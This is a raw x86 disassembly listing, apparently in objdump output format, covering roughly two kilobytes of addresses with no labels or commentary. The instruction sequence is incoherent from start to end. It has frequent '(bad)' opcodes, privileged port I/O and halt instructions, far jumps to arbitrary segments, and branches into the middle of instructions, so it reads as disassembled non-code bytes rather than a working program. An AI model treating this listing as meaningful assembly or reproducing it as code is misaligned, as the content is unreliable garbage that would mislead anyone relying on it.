  41a4b6:	jmp    0x41a441
  41a4b8:	int    0x22
  41a4ba:	call   0x8176:0x339518bd
  41a4c1:	cs mov esi,0xa762ce0d
  41a4c7:	dec    esi
  41a4c8:	je     0x41a4e0
  41a4ca:	dec    eax
  41a4cb:	jp     0x41a4ef
  41a4cd:	jo     0x41a48f
  41a4cf:	jb     0x41a506
  41a4d1:	in     al,0xf3
  41a4d3:	mov    eax,ds:0xa71dff58
  41a4d8:	leave  
  41a4d9:	int    0x18
  41a4db:	iret   
  41a4dc:	scas   eax,DWORD PTR es:[edi]
  41a4dd:	lahf   
  41a4de:	dec    esp
  41a4df:	mov    al,ds:0x30bcdb7c
  41a4e4:	add    BYTE PTR [edi],bl
  41a4e6:	jbe    0x41a4d1
  41a4e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4e9:	push   ss
  41a4ea:	mov    al,ds:0xe30b8532
  41a4ef:	and    cl,0xa7
  41a4f2:	mov    edi,0x5fc07456
  41a4f7:	hlt    
  41a4f8:	fcom   QWORD PTR [ecx-0x57]
  41a4fb:	pop    ds
  41a4fc:	mov    WORD PTR [edx+0x6d4a35dc],gs
  41a502:	(bad)  
  41a503:	jle    0x41a4a0
  41a505:	iret   
  41a506:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a507:	pop    ebp
  41a508:	std    
  41a509:	dec    edi
  41a50a:	out    0x10,eax
  41a50c:	scas   al,BYTE PTR es:[edi]
  41a50d:	push   ss
  41a50e:	sub    eax,0x2d67053c
  41a513:	add    al,0xbf
  41a515:	xor    dl,dh
  41a517:	sub    bl,bh
  41a519:	inc    ebx
  41a51a:	or     esp,DWORD PTR [ebp-0xbc6a4b0]
  41a520:	xchg   esi,eax
  41a521:	mov    ds:0x35e55347,eax
  41a526:	jge    0x41a553
  41a528:	fld    DWORD PTR [edx+0x6af33835]
  41a52e:	adc    bl,BYTE PTR [ecx]
  41a530:	pop    es
  41a531:	fstp   TBYTE PTR [ebx]
  41a533:	test   BYTE PTR [edi-0x9],0xc
  41a537:	stc    
  41a538:	stos   DWORD PTR es:[edi],eax
  41a539:	push   es
  41a53a:	jbe    0x41a4fd
  41a53c:	rol    BYTE PTR [ebx],1
  41a53e:	addr16 xor eax,0xca728719
  41a544:	mov    WORD PTR [edx],?
  41a546:	pop    eax
  41a547:	sub    BYTE PTR [edi+0x567e8e8a],cl
  41a54d:	retf   
  41a54e:	xor    BYTE PTR [ebp+0x28],dh
  41a551:	mov    al,0xfe
  41a553:	mov    dh,0x4f
  41a555:	fistp  WORD PTR [ecx+eiz*4+0x59]
  41a559:	mov    edx,0x76786ae8
  41a55e:	jle    0x41a4fa
  41a560:	pusha  
  41a561:	sbb    al,0x7b
  41a563:	stos   DWORD PTR es:[edi],eax
  41a564:	test   eax,0x33a2233d
  41a569:	cmp    BYTE PTR [ebx-0x16],cl
  41a56c:	and    al,0x91
  41a56e:	cld    
  41a56f:	sbb    ah,ch
  41a571:	dec    edx
  41a572:	xlat   BYTE PTR ds:[ebx]
  41a573:	mov    esi,0x40e9ceb3
  41a578:	gs jle 0x41a51a
  41a57b:	imul   esi,ebp,0xfc025cf8
  41a581:	cmp    BYTE PTR [edx+0x52c7d66b],al
  41a587:	daa    
  41a588:	jecxz  0x41a562
  41a58a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a58b:	mul    ecx
  41a58d:	(bad)  
  41a58f:	shl    DWORD PTR [ebp-0x7731c09c],cl
  41a595:	mov    ebp,esp
  41a597:	scas   al,BYTE PTR es:[edi]
  41a598:	jle    0x41a5a5
  41a59a:	push   ss
  41a59b:	jg     0x41a5b6
  41a59d:	jmp    0x1dd6:0xbb05fb63
  41a5a4:	mov    ds:0xff8c0d70,al
  41a5a9:	xchg   DWORD PTR [ecx+0x7e],edi
  41a5ac:	dec    ecx
  41a5ad:	lods   eax,DWORD PTR ds:[esi]
  41a5ae:	(bad)
  41a5b2:	sub    dh,dh
  41a5b4:	mov    edx,0xf4647779
  41a5b9:	jmp    0x41a5e0
  41a5bb:	dec    eax
  41a5bc:	sub    al,0x6e
  41a5be:	pop    esi
  41a5bf:	std    
  41a5c0:	addr16 adc al,0x40
  41a5c3:	pop    eax
  41a5c4:	xor    ecx,0xffffffaf
  41a5c7:	das    
  41a5c8:	shl    BYTE PTR [eax-0x76095cb6],1
  41a5ce:	cmp    al,BYTE PTR [edx+eax*1+0x749bc807]
  41a5d5:	mov    dh,0xf0
  41a5d7:	jbe    0x41a574
  41a5d9:	xchg   DWORD PTR ds:0x9df295e6,esp
  41a5df:	fadd   QWORD PTR [edi-0xc36d9e5]
  41a5e5:	pop    esi
  41a5e6:	ret    0x9ee4
  41a5e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5ea:	jmp    DWORD PTR [edx-0x684af02]
  41a5f0:	cwde   
  41a5f1:	jb     0x41a5e2
  41a5f3:	mov    al,ds:0x90697d8b
  41a5f8:	add    eax,0x579dcdb7
  41a5fd:	mov    bh,0x72
  41a5ff:	call   0x7636:0xeb85dc77
  41a606:	fs sub bl,dl
  41a609:	sbb    cl,BYTE PTR [ebx-0x31]
  41a60c:	jnp    0x41a5bf
  41a60e:	(bad)
  41a611:	out    0x9c,eax
  41a613:	jno    0x41a5d4
  41a615:	loope  0x41a64b
  41a617:	mov    esi,0x92a180ca
  41a61c:	jae    0x41a683
  41a61e:	repnz push ebp
  41a620:	sub    edx,DWORD PTR [ecx+esi*1+0x7f80a6a]
  41a627:	mov    WORD PTR [eax-0x75b4eb12],ds
  41a62d:	pop    esi
  41a62e:	(bad)  
  41a62f:	cmp    eax,0x70ff9aad
  41a634:	jg     0x41a682
  41a636:	aas    
  41a637:	mov    esi,0xf2de5654
  41a63c:	std    
  41a63d:	fld    DWORD PTR ds:0x65ad2b19
  41a643:	ret    0x4908
  41a646:	sub    eax,0x56d69000
  41a64b:	scas   al,BYTE PTR es:[edi]
  41a64c:	mov    dh,0xc6
  41a64e:	fistp  QWORD PTR [ecx+0x5e]
  41a651:	mov    edx,0x9a3dbef1
  41a656:	sub    eax,0x938e6729
  41a65b:	dec    ecx
  41a65c:	xor    al,0x92
  41a65e:	pmuludq mm1,QWORD PTR ds:0x737c01cc
  41a665:	cs in  al,0x27
  41a668:	or     al,0x14
  41a66a:	push   ecx
  41a66b:	arpl   WORD PTR [ebp-0x325c4d9b],si
  41a671:	imul   ebx,DWORD PTR [ebp+0x4ab7b4d6],0xab1ef26d
  41a67b:	mov    eax,ds:0xf7c256d5
  41a680:	mov    dh,0xad
  41a682:	inc    edi
  41a683:	cmp    edx,DWORD PTR [ebx]
  41a685:	test   al,0x92
  41a687:	aas    
  41a688:	iret   
  41a689:	idiv   DWORD PTR [ebx+0x71]
  41a68c:	mov    ds:0x3a28f4c3,al
  41a691:	(bad)  
  41a692:	fmul   DWORD PTR [ecx-0x5318745]
  41a698:	pop    edx
  41a699:	or     DWORD PTR [ecx+0x42],ebx
  41a69c:	das    
  41a69d:	inc    esp
  41a69e:	add    BYTE PTR [esi+0x14],ch
  41a6a1:	aaa    
  41a6a2:	jl     0x41a6e2
  41a6a4:	sahf   
  41a6a5:	cmc    
  41a6a6:	inc    eax
  41a6a7:	shl    DWORD PTR [esi+edx*4+0x4b],cl
  41a6ab:	adc    BYTE PTR [ebp+0x7e6ee6ea],cl
  41a6b1:	call   0x883f:0xdd789a1e
  41a6b8:	div    ebx
  41a6ba:	outs   dx,DWORD PTR ds:[esi]
  41a6bb:	sub    al,0xe2
  41a6bd:	xlat   BYTE PTR ds:[ebx]
  41a6be:	lea    edi,[ebx+ebp*8]
  41a6c1:	xor    ecx,ecx
  41a6c3:	or     eax,0xf5dd28f8
  41a6c8:	push   ecx
  41a6c9:	mov    ds:0xfb91889b,eax
  41a6ce:	sbb    dh,BYTE PTR [ecx-0x54925072]
  41a6d4:	stos   BYTE PTR es:[edi],al
  41a6d5:	pop    edi
  41a6d6:	addr16 push edx
  41a6d8:	sbb    eax,0xd4b206f3
  41a6dd:	jns    0x41a67d
  41a6df:	(bad)  
  41a6e0:	mov    cl,0x7a
  41a6e2:	add    edi,DWORD PTR [ecx]
  41a6e4:	ret    
  41a6e5:	scas   al,BYTE PTR es:[edi]
  41a6e6:	pop    ss
  41a6e7:	fidiv  WORD PTR [ebp-0x5911ba7d]
  41a6ed:	outs   dx,DWORD PTR ds:[esi]
  41a6ee:	adc    eax,0x9147119c
  41a6f3:	stos   DWORD PTR es:[edi],eax
  41a6f4:	mov    esp,ebx
  41a6f6:	adc    al,0x45
  41a6f8:	pop    ds
  41a6f9:	(bad)  
  41a6fa:	scas   al,BYTE PTR es:[edi]
  41a6fb:	ins    DWORD PTR es:[edi],dx
  41a6fc:	push   ss
  41a6fd:	add    edx,DWORD PTR [ecx]
  41a6ff:	scas   al,BYTE PTR es:[edi]
  41a700:	mov    cl,0xb1
  41a702:	jp     0x41a753
  41a704:	or     al,0xe1
  41a706:	mov    bh,0xc8
  41a708:	js     0xf648564c
  41a70e:	cmp    bl,ch
  41a710:	loopne 0x41a6bc
  41a712:	push   edi
  41a713:	aaa    
  41a714:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a715:	enter  0x543f,0x2a
  41a719:	test   eax,edx
  41a71b:	mov    al,ds:0x1943a4a
  41a720:	retf   
  41a721:	adc    eax,0x1dd023fe
  41a726:	inc    ecx
  41a727:	int    0xf5
  41a729:	inc    eax
  41a72a:	dec    edi
  41a72b:	or     edx,DWORD PTR [edi]
  41a72d:	cdq    
  41a72e:	inc    eax
  41a72f:	icebp  
  41a730:	jl     0x41a6ea
  41a732:	stos   DWORD PTR es:[edi],eax
  41a733:	rol    ah,1
  41a735:	je     0x41a751
  41a737:	mov    ax,fs:0x87c4a54c
  41a73e:	jne    0x41a786
  41a740:	push   eax
  41a741:	mov    eax,DWORD PTR [eax+0x7849b0b0]
  41a747:	dec    esi
  41a748:	js     0x41a75e
  41a74a:	push   ds
  41a74b:	xor    dh,ah
  41a74d:	lods   al,BYTE PTR ds:[esi]
  41a74e:	arpl   sp,cx
  41a750:	or     edx,ebx
  41a752:	dec    edi
  41a753:	xor    eax,0x72733190
  41a758:	lock leave 
  41a75a:	pop    esi
  41a75b:	fldcw  WORD PTR [ebx+0x270e84c9]
  41a761:	test   al,0x94
  41a763:	test   BYTE PTR [ebx],al
  41a765:	mov    ebx,0x68348c68
  41a76a:	inc    esi
  41a76b:	fld    QWORD PTR [ecx]
  41a76d:	pop    eax
  41a76e:	fs pusha 
  41a770:	in     eax,0x2f
  41a772:	or     eax,0x85d9c71
  41a777:	popa   
  41a778:	mov    ds:0x8e1df107,al
  41a77d:	mov    al,ds:0xc125fa99
  41a782:	push   ebp
  41a783:	or     dh,BYTE PTR [ebx-0x68]
  41a786:	out    0x59,eax
  41a788:	cmp    ebp,DWORD PTR [ebx]
  41a78a:	dec    ebx
  41a78b:	jmp    0xc5d:0x6b40114c
  41a792:	nop
  41a793:	arpl   WORD PTR [edx],cx
  41a795:	outs   dx,DWORD PTR ds:[esi]
  41a796:	or     BYTE PTR [edx-0x56],ch
  41a799:	mov    eax,0xf21e1b1d
  41a79e:	ficom  WORD PTR [eax-0x15]
  41a7a1:	jecxz  0x41a786
  41a7a3:	xor    al,0x12
  41a7a5:	or     BYTE PTR [eax],bl
  41a7a7:	inc    ecx
  41a7a8:	adc    al,0xf6
  41a7aa:	sbb    DWORD PTR [edx-0x39],ebx
  41a7ad:	and    eax,0x4041a52e
  41a7b2:	loope  0x41a778
  41a7b4:	mov    eax,0xa5432d3f
  41a7b9:	xor    BYTE PTR [edi+0x61],0x50
  41a7bd:	test   BYTE PTR [ebp+0x4e],bl
  41a7c0:	push   eax
  41a7c1:	shr    BYTE PTR [ebp-0x461e459d],cl
  41a7c7:	sub    al,BYTE PTR [edx+0x16fc7e0f]
  41a7cd:	jmp    0x3091:0x83f84393
  41a7d4:	(bad)  
  41a7d5:	cli    
  41a7d6:	(bad)  
  41a7d7:	pop    DWORD PTR [ecx]
  41a7d9:	xor    esi,edi
  41a7db:	xlat   BYTE PTR ds:[ebx]
  41a7dc:	int    0xd0
  41a7de:	fcomp  DWORD PTR [edi]
  41a7e0:	aaa    
  41a7e1:	inc    esi
  41a7e2:	or     eax,0xab63ea0c
  41a7e7:	std    
  41a7e8:	shr    BYTE PTR [ecx],1
  41a7ea:	dec    DWORD PTR [edi-0x7550f019]
  41a7f0:	xchg   esp,eax
  41a7f1:	xchg   esi,eax
  41a7f2:	dec    esp
  41a7f3:	pushf  
  41a7f4:	adc    al,0xb6
  41a7f6:	data16 daa 
  41a7f8:	jo     0x41a78e
  41a7fa:	enter  0x1271,0xd9
  41a7fe:	retf   0xef6d
  41a801:	fcom   st(7)
  41a803:	dec    edx
  41a804:	push   eax
  41a805:	push   cs
  41a806:	push   ecx
  41a807:	mov    eax,ds:0xa36c92ab
  41a80c:	mov    cl,0x37
  41a80e:	in     eax,0x33
  41a810:	cmc    
  41a811:	adc    eax,0xa7b482cc
  41a816:	fmul   DWORD PTR [ebx]
  41a818:	mov    cl,cl
  41a81a:	pop    esi
  41a81b:	in     eax,0x2a
  41a81d:	jnp    0x41a7e8
  41a81f:	sbb    ah,BYTE PTR ds:0x6f5bf976
  41a825:	jo     0x41a7e6
  41a827:	push   cs
  41a828:	cmp    eax,0xbe269c1c
  41a82d:	test   BYTE PTR [edx+edx*2-0x2b],dh
  41a831:	or     dl,BYTE PTR [esi-0x2baf9853]
  41a837:	imul   esi,DWORD PTR [ebx+0x62],0xccf400b1
  41a83e:	cwde   
  41a83f:	mov    edx,0xf90433a9
  41a844:	in     eax,dx
  41a845:	aaa    
  41a846:	pop    es
  41a847:	jmp    0x4f9d:0x9840f2fb
  41a84e:	jbe    0x41a8a4
  41a850:	or     edi,DWORD PTR [ebx]
  41a852:	mov    ah,0x14
  41a854:	xchg   ebp,eax
  41a855:	jns    0x41a7d7
  41a857:	xchg   esi,eax
  41a858:	sub    ebp,esi
  41a85a:	pop    esp
  41a85b:	or     al,0x30
  41a85d:	imul   eax,DWORD PTR [ebx-0x1efe472f],0x76f05c8d
  41a867:	out    0x6f,eax
  41a869:	shr    BYTE PTR [ebp-0x71d8446b],0x57
  41a870:	mov    bh,0xb0
  41a872:	sbb    al,0x51
  41a874:	repnz ds pushf 
  41a877:	repz jmp 0x41a834
  41a87a:	out    0x91,eax
  41a87c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a87d:	inc    ebp
  41a87e:	or     BYTE PTR [edx+0x71],0x68
  41a882:	sbb    al,0x8a
  41a884:	xor    eax,0x9e8b51e7
  41a889:	lock sub ebx,ebx
  41a88c:	jg     0x41a8d5
  41a88e:	sub    cl,BYTE PTR [esi-0x26f686ee]
  41a894:	(bad)  
  41a895:	add    ah,al
  41a897:	cmp    eax,0xd724dd08
  41a89c:	shl    BYTE PTR [ecx-0x5865bac7],cl
  41a8a2:	dec    ecx
  41a8a3:	add    eax,0x951a813b
  41a8a8:	popa   
  41a8a9:	and    al,0x78
  41a8ab:	mov    esi,DWORD PTR [ecx-0x1e80dbbf]
  41a8b1:	inc    eax
  41a8b2:	mov    edi,0xaee236ba
  41a8b7:	stc    
  41a8b8:	aam    0x53
  41a8ba:	inc    edx
  41a8bb:	outs   dx,DWORD PTR ds:[esi]
  41a8bc:	xlat   BYTE PTR ds:[ebx]
  41a8bd:	pusha  
  41a8be:	xchg   esi,eax
  41a8bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8c0:	adc    bl,cl
  41a8c2:	cs dec esp
  41a8c4:	mov    al,ah
  41a8c6:	pop    ds
  41a8c7:	int3   
  41a8c8:	push   ecx
  41a8c9:	mov    dl,0x6f
  41a8cb:	stos   BYTE PTR es:[edi],al
  41a8cc:	retf   
  41a8cd:	add    al,0x76
  41a8cf:	scas   al,BYTE PTR es:[edi]
  41a8d0:	(bad)  
  41a8d1:	mul    ah
  41a8d3:	mov    ecx,0x7ddc154b
  41a8d8:	jg     0x41a88d
  41a8da:	and    BYTE PTR [ebx],ah
  41a8dc:	lods   eax,DWORD PTR ds:[esi]
  41a8dd:	ret    0xc748
  41a8e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8e1:	mov    WORD PTR ds:0x291e846a,es
  41a8e7:	mov    edi,eax
  41a8e9:	lock and eax,0x4aaedf03
  41a8ef:	mov    dh,0xbc
  41a8f1:	js     0x41a8c5
  41a8f3:	adc    eax,0xfa76154d
  41a8f8:	mov    eax,ds:0x583a6615
  41a8fd:	call   0x8f52:0xab99c8fc
  41a904:	lds    eax,FWORD PTR [eax-0x654bce8a]
  41a90a:	adc    BYTE PTR [ecx+eax*1-0x4a12c175],al
  41a911:	mov    dh,0x18
  41a913:	cmc    
  41a914:	aaa    
  41a915:	je     0x41a8ef
  41a917:	sbb    ebx,DWORD PTR [edx+eax*4]
  41a91a:	call   0xd45b3912
  41a91f:	sub    al,0x8c
  41a921:	xchg   edx,eax
  41a922:	enter  0x7281,0x82
  41a926:	(bad)  
  41a927:	xchg   ebx,eax
  41a928:	sub    DWORD PTR [eax],edx
  41a92a:	lds    esi,FWORD PTR [esi+0x2f]
  41a92d:	fsubp  st(0),st
  41a92f:	in     al,dx
  41a930:	lods   al,BYTE PTR ds:[esi]
  41a931:	les    esi,FWORD PTR [esi-0x61]
  41a934:	(bad)  
  41a935:	sti    
  41a936:	daa    
  41a937:	outs   dx,DWORD PTR ds:[esi]
  41a938:	adc    DWORD PTR [esi],0x6f6d97aa
  41a93e:	femms  
  41a940:	inc    ecx
  41a941:	push   eax
  41a942:	and    al,0xb0
  41a944:	push   ebx
  41a945:	test   DWORD PTR [ebx-0x5],ebp
  41a948:	int    0xa9
  41a94a:	test   eax,edx
  41a94c:	fiadd  DWORD PTR [ecx]
  41a94e:	inc    ecx
  41a94f:	push   eax
  41a950:	sahf   
  41a951:	adc    eax,0x45ca852e
  41a956:	or     DWORD PTR [ecx],edi
  41a958:	sahf   
  41a959:	push   ebp
  41a95a:	enter  0x359e,0x4c
  41a95e:	push   edi
  41a95f:	retf   
  41a960:	sbb    dl,BYTE PTR [eax]
  41a962:	es js  0x41a9a3
  41a965:	mov    eax,ds:0x958df825
  41a96a:	aam    0xcc
  41a96c:	fcmovnbe st,st(0)
  41a96e:	mov    ebx,0x748ada03
  41a973:	scas   eax,DWORD PTR es:[edi]
  41a974:	jg     0x41a906
  41a976:	sbb    bh,BYTE PTR [ecx-0x65142221]
  41a97c:	ss out dx,al
  41a97e:	icebp  
  41a97f:	fdiv   QWORD PTR [ebx+0x3d]
  41a982:	mov    al,ds:0x60e4b26d
  41a987:	or     ch,BYTE PTR [edx-0x17500680]
  41a98d:	fucomip st,st(0)
  41a98f:	dec    ebp
  41a990:	fcomp  DWORD PTR [edx-0x603e6f7c]
  41a996:	or     al,BYTE PTR [edx-0x25fbeda5]
  41a99c:	pop    ecx
  41a99d:	xchg   ecx,eax
  41a99e:	sub    al,0xe4
  41a9a0:	out    0x3d,eax
  41a9a2:	xor    dl,BYTE PTR [ecx-0x7acf7]
  41a9a8:	xor    eax,0xaa20a839
  41a9ad:	cmp    dh,BYTE PTR [ebx+esi*8]
  41a9b0:	cmp    DWORD PTR [esi+0x2c],0x60
  41a9b4:	xor    eax,0x26010d55
  41a9b9:	jl     0x41a983
  41a9bb:	lea    esp,[ecx-0x697d61b8]
  41a9c1:	aad    0xe
  41a9c3:	mov    edx,0x3be77317
  41a9c8:	mov    esi,0xbaefa8cc
  41a9cd:	jb     0x41a97a
  41a9cf:	xor    DWORD PTR ds:0x77c09888,ecx
  41a9d5:	mov    eax,ds:0x8a6b1b1c
  41a9da:	fs je  0x41a98b
  41a9dd:	add    esi,DWORD PTR [ebp-0x33ec8c82]
  41a9e3:	in     al,dx
  41a9e4:	jp     0x41a9c8
  41a9e6:	lea    ebx,[esi+0x35]
  41a9e9:	je     0x41a9a2
  41a9eb:	sub    eax,0xc2a6abe6
  41a9f0:	mov    edi,0xb69aaced
  41a9f5:	dec    ecx
  41a9f6:	jmp    0x39de60eb
  41a9fb:	mov    DWORD PTR [ecx-0x4cff64d6],edi
  41aa01:	call   0xf76d9908
  41aa06:	push   eax
  41aa07:	sub    eax,0xabe5c5e2
  41aa0c:	cli    
  41aa0d:	leave  
  41aa0e:	(bad)  
  41aa0f:	call   0xb880e5f0
  41aa14:	mov    al,ds:0xfed9ef8f
  41aa19:	inc    esp
  41aa1a:	clc    
  41aa1b:	sub    bh,BYTE PTR ds:0x33937475
  41aa21:	ss push 0xb655eaa9
  41aa27:	pop    edx
  41aa28:	addr16 mov ecx,0x90ff5374
  41aa2e:	adc    BYTE PTR [eax+ebp*1+0xa],al
  41aa32:	sbb    ch,ah
  41aa34:	test   al,0x5a
  41aa36:	fistp  QWORD PTR [ecx+edi*2+0x68]
  41aa3a:	or     ebp,DWORD PTR [ebx+0x53]
  41aa3d:	sub    bh,BYTE PTR [edi-0x26]
  41aa40:	in     al,dx
  41aa41:	retf   
  41aa42:	jnp    0x41a9e4
  41aa44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa45:	(bad)  
  41aa46:	ficomp DWORD PTR [esp+eiz*8-0x77f8726a]
  41aa4d:	sub    DWORD PTR [ebx-0x1a974cb7],edx
  41aa53:	or     al,0xe6
  41aa55:	sub    eax,DWORD PTR [ebx+0x5]
  41aa58:	pop    ss
  41aa59:	lea    ebp,[ebp+0x34]
  41aa5c:	dec    edi
  41aa5d:	mov    eax,DWORD PTR [ecx+0x64]
  41aa60:	test   DWORD PTR [edx],edx
  41aa62:	sub    al,0xa0
  41aa64:	jnp    0x41aa02
  41aa66:	out    0x2e,eax
  41aa68:	pusha  
  41aa69:	ds jmp 0x2a7:0x46cac327
  41aa71:	(bad)  
  41aa73:	push   edi
  41aa74:	xchg   esp,eax
  41aa75:	ret    
  41aa76:	lea    ebp,[edi-0x70]
  41aa79:	int    0xe
  41aa7b:	rol    DWORD PTR [ebp-0x80],0xa5
  41aa7f:	adc    BYTE PTR [esi+eiz*2+0x34],ah
  41aa83:	pop    es
  41aa84:	jmp    DWORD PTR [ecx+0xa]
  41aa87:	adc    al,0xfa
  41aa89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa8a:	push   edi
  41aa8b:	inc    ecx
  41aa8c:	and    cl,bh
  41aa8e:	pop    ds
  41aa8f:	mov    ds:0xed605e23,eax
  41aa94:	push   eax
  41aa95:	jecxz  0x41aad7
  41aa97:	sbb    BYTE PTR [ebp+0x1a1c0791],bl
  41aa9d:	loopne 0x41aa61
  41aa9f:	and    DWORD PTR [eax],0x29
  41aaa2:	mov    esp,0x8f445fbd
  41aaa7:	nop
  41aaa8:	fwait
  41aaa9:	inc    ecx
  41aaaa:	sub    al,0x6c
  41aaac:	mov    DWORD PTR [edi],0xb493371c
  41aab2:	int3   
  41aab3:	jb     0x41aa95
  41aab5:	rcl    BYTE PTR [edx-0x59],cl
  41aab8:	and    bl,BYTE PTR [eax+0x17d701ef]
  41aabe:	imul   esi,DWORD PTR [esi],0x44f7df39
  41aac4:	(bad)  
  41aac6:	arpl   bp,ax
  41aac8:	jae    0x41aab8
  41aaca:	(bad)  
  41aacb:	es push ebx
  41aacd:	jbe    0x41aa6f
  41aacf:	mov    ecx,0x44f71e9
  41aad4:	ror    DWORD PTR [edi],0xfa
  41aad7:	gs ss ret 0x9eeb
  41aadc:	sahf   
  41aadd:	sub    al,0x9b
  41aadf:	mov    eax,ds:0xc3cd1304
  41aae4:	add    edx,DWORD PTR [ebx+0x2544ec01]
  41aaea:	fldcw  WORD PTR [eax]
  41aaec:	jne    0x41ab37
  41aaee:	inc    edi
  41aaef:	dec    esp
  41aaf0:	dec    ecx
  41aaf1:	and    dh,ah
  41aaf3:	and    eax,0x46f9a9d2
  41aaf8:	mov    esp,0xdf108bfa
  41aafd:	and    esi,ebp
  41aaff:	mov    bh,0x86
  41ab01:	mov    ds:0xafdf5e01,al
  41ab06:	addr16 test al,0xbf
  41ab09:	loope  0x41aa90
  41ab0b:	push   edx
  41ab0c:	dec    esi
  41ab0d:	add    al,BYTE PTR ds:0x3309215c
  41ab13:	dec    edx
  41ab14:	inc    esi
  41ab15:	mov    edx,0x6d09921b
  41ab1a:	jno    0x41ab62
  41ab1c:	mov    dl,0xb2
  41ab1e:	xchg   esp,eax
  41ab1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab20:	adc    dh,bl
  41ab22:	xor    al,0xe4
  41ab24:	push   ebx
  41ab25:	dec    edi
  41ab26:	push   esp
  41ab27:	loope  0x41ab0d
  41ab29:	dec    ebx
  41ab2a:	add    edi,DWORD PTR [eiz*8-0x5cdbc0e7]
  41ab31:	add    DWORD PTR [eax*1+0x72288a65],0xd063d959
  41ab3c:	aaa    
  41ab3d:	add    ch,BYTE PTR ds:0x89fdbcae
  41ab43:	or     bh,BYTE PTR ds:0xc5140f1c
  41ab49:	jmp    0x41aae5
  41ab4b:	cmp    al,0xc1
  41ab4d:	cmp    al,BYTE PTR [esi-0x2c1de771]
  41ab53:	mov    edi,0xc4010ba4
  41ab58:	cmp    eax,0x1ecefd8a
  41ab5d:	or     DWORD PTR [ebx-0x54],0x96783207
  41ab64:	sbb    al,0x93
  41ab66:	loopne 0x41ab29
  41ab68:	out    0x61,eax
  41ab6a:	fsub   QWORD PTR [edx-0x22a71e6c]
  41ab70:	mov    dl,0x40
  41ab72:	sub    DWORD PTR [esi-0x2af8d784],ecx
  41ab78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab79:	sbb    ah,BYTE PTR [esi]
  41ab7b:	cmp    esi,DWORD PTR [ebp*8+0x361a3677]
  41ab82:	mov    edi,0xd43330c
  41ab87:	leave  
  41ab88:	mov    ebx,0x5e073192
  41ab8d:	(bad)
  41ab91:	(bad)  
  41ab92:	call   0x100f1c7a
  41ab97:	mov    esi,0x4b80529a
  41ab9c:	mov    ah,0xd8
  41ab9e:	xchg   esp,eax
  41ab9f:	hlt    
  41aba0:	aaa    
  41aba1:	in     al,dx
  41aba2:	out    dx,eax
  41aba3:	push   DWORD PTR [ebx-0x6]
  41aba6:	outs   dx,DWORD PTR ds:[esi]
  41aba7:	pop    ebx
  41aba8:	rcr    ebp,0x8f
  41abab:	pop    esp
  41abac:	imul   ebx,DWORD PTR [ecx-0x47],0x8f49c6b0
  41abb3:	dec    eax
  41abb4:	mov    al,ds:0xb48c335d
  41abb9:	loop   0x41ac14
  41abbb:	jno    0x41abe6
  41abbd:	sbb    eax,0xf5a17f54
  41abc2:	xchg   ebp,eax
  41abc3:	rol    BYTE PTR [edx],cl
  41abc5:	mov    ds:0xdce841bd,al
  41abca:	mov    al,ds:0x9bc19f4b
  41abcf:	dec    ebp
  41abd0:	test   BYTE PTR [eax],ah
  41abd2:	imul   ebp,DWORD PTR [esp+ebx*1-0x4a],0x318d5d0b
  41abda:	and    DWORD PTR [eax-0x3d],eax
  41abdd:	add    ebx,DWORD PTR ds:0x285fdfd2
  41abe3:	xchg   ebp,eax
  41abe4:	mov    ebx,0xa9440c3b
  41abe9:	and    eax,0x4784038c
  41abee:	cmp    ecx,DWORD PTR [eax+0x78]
  41abf1:	xchg   esp,eax
  41abf2:	pop    ebp
  41abf3:	xlat   BYTE PTR ds:[ebx]
  41abf4:	and    eax,0xb06cc16b
  41abf9:	pop    ecx
  41abfa:	xor    al,0x9b
  41abfc:	aas    
  41abfd:	and    DWORD PTR [edx-0x4c2ed847],0x8516621f
  41ac07:	mov    ah,ah
  41ac09:	neg    bh
  41ac0b:	ins    DWORD PTR es:[edi],dx
  41ac0c:	fsubr  QWORD PTR [ebx-0x58]
  41ac0f:	cld    
  41ac10:	mov    ecx,0xfd935944
  41ac15:	adc    edx,DWORD PTR [edi+0x55]
  41ac18:	add    eax,DWORD PTR [edi-0x4a]
  41ac1b:	xor    cl,BYTE PTR [ebx]
  41ac1d:	mov    esi,0x62f06c19
  41ac22:	loope  0x41abc9
  41ac24:	pushf  
  41ac25:	push   0x1bf4b608
  41ac2a:	sbb    al,0x60
  41ac2c:	pop    ebx
  41ac2d:	mov    al,ds:0xe85b9ad4
  41ac32:	cmp    DWORD PTR [esi*4+0x39cce51f],0xfee66471
  41ac3d:	pusha  
  41ac3e:	nop
  41ac3f:	jo     0x41ac43
  41ac41:	xor    dl,BYTE PTR [ebp+0x12]
  41ac44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac45:	push   cs
  41ac46:	pop    ss
  41ac47:	pop    eax
  41ac48:	pop    ebx
  41ac49:	push   esp
  41ac4a:	outs   dx,BYTE PTR ds:[esi]
  41ac4b:	adc    DWORD PTR [ecx],esp
  41ac4d:	inc    ecx
  41ac4e:	loope  0x41ac0a
  41ac50:	xchg   ebp,eax
  41ac51:	sbb    eax,0xcafed31
  41ac56:	sub    eax,DWORD PTR [ebp+0x1]
  41ac59:	test   ebp,ecx
  41ac5b:	inc    ecx
  41ac5c:	jg     0x41abed
  41ac5e:	xor    ecx,DWORD PTR [edi+0x56f134b0]
  41ac64:	fcmovbe st,st(2)
  41ac66:	fidivr DWORD PTR [ebx-0xb0174f6]
  41ac6c:	pop    edx
  41ac6d:	adc    esi,DWORD PTR [esi+0x74]
  41ac70:	gs jns 0x41ac88
  41ac73:	shl    al,0x25
  41ac76:	ficomp DWORD PTR [ecx-0x769d0305]
  41ac7c:	sub    esi,esi
  41ac7e:	mov    ch,BYTE PTR [eax]
  41ac80:	aam    0x8f
  41ac82:	in     al,dx
  41ac83:	jle    0x41acbd
  41ac85:	inc    edx
  41ac86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
